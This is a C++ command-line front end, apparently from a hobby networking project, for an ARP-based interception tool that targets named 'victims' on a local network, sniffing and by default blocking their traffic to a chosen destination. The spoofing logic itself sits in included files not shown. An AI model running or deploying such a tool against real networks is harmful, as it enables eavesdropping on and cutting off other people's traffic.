#include "../../linux/interface_gateway.h"
#include "../../temp_utils/net_arp/net_arp.h"
#include "../../linux/hardware.h"
#include "../../linux/osi/data_link_layer_gateway.h"

#include <unistd.h>
#include <boost/program_options.hpp>
#include <iostream>
using namespace std;

void net_intercept_main(const string& iface, const vector<ip4_addr> &victim, ip4_addr dest, bool block) {
    net_arp scanner(new data_link_layer_gateway(iface));

    scanner.intercept_device_traffic(victim, dest, block, get_mac_addr_of_iface(iface), get_ip_addr_of_iface(iface));
}


namespace po = boost::program_options;

int main(int argc, char **argv) {
    po::options_description opts("Allowed options");
    opts.add_options()
            ("help", "print tool use description")
            ("interface,i", po::value<string>(), "linux interface to use")
            ("victims", po::value<vector<string>>()->multitoken(),
             "victims' ip for the attack. if not specified, sends to whole network (broadcast)")
            ("dest", po::value<string>(),
             "destination ip from the victims into")
            ("block", po::value<bool>(),
             "blocks the traffic, in addition to sniffing it. if not specified, true by default");
//    ("both", "preform attack in both directions, from the victim to the dest and the opposite");

    po::variables_map vm;
    po::store(po::parse_command_line(argc, argv, opts), vm);
    po::notify(vm);


    if (vm.count("help")) {
        cout << opts << endl;
        return 1;
    }

    if (!vm.count("interface")) {
        cout << opts << endl;
        return 1;
    }
    string interface = vm["interface"].as<string>();

    if (!vm.count("dest")) {
        cout << opts << endl;
        return 1;
    }
    string dest = vm["dest"].as<string>();

    bool block = true;
    if (vm.count("block")) {
        block = vm["block"].as<bool>();
    }

    bool has_victim;
    vector<string> victims;
    if (!vm.count("victims")) {
        has_victim = false;
    } else {
        victims = vm["victims"].as<vector<string>>();
        has_victim = true;
    }


    cout << "victims:" << endl;
    vector<ip4_addr> victims_ip;
    for (string &victim: victims) {
        cout << victim << " ";
        victims_ip.push_back(convert_to_ip4_addr(victim));
    }
    cout << endl;

    net_intercept_main(interface, victims_ip, convert_to_ip4_addr(dest), block);

}